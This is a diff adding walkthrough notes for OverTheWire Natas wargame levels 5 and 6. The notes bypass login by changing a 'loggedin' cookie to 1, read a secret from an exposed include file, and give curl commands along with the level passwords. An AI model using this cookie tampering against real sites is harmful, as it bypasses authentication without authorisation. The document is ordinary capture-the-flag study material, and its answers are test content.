@@ -63,3 +63,34 @@
 
 -python:
     - [natas4/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas4/solve.py)
+
+- natas5
+    - ```Login to web:```
+    - ```Access disallowed. You are not logged in```
+    - ```It might be a problem with the session / cookie by the error```
+    - ```Chrome:```
+        - ```Developer tools -> Application -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh```
+    - ```Firefox:```
+        - ```Developer tools -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh```
+    - ```BurpSuite:```
+        - ```Intercept data with burp proxy > changed Cookie: __utma=176859643.542715508.1591005549.1591005549.1591025816.2; __utmc=176859643; __utmz=176859643.1591005549.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=176859643.7.10.1591025816; loggedin=1 -> Forward```
+
+- curl:
+    - ```curl -sv http://natas5.natas.labs.overthewire.org/ --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie 'loggedin=1' | grep "Access" | sed s'/<\/div>//g' | awk '{print $8}'```
+
+- python:
+    - [natas5/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas5/solve.py)
+
+- natas6
+    - ```Login to web:```
+    - ```Input Secret:```
+    - ```View the source code, found an includes file include "includes/secret.inc";```
+    - ```view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc```
+    - ```input the secret code: FOEIUWGHFEEUHOFUOIU```
+
+- curl:
+    - ```curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -F secret=FOEIUWGHFEEUHOFUOIU -F submit=submit | grep "Access" | awk '{print $8}'```
+    - ```curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -H 'Content-Type: application/x-www-form-urlencoded' -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=submit' | grep "Access" | awk '{print $8}'```
+
+- python:
+    [natas6/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas6/solve.py)
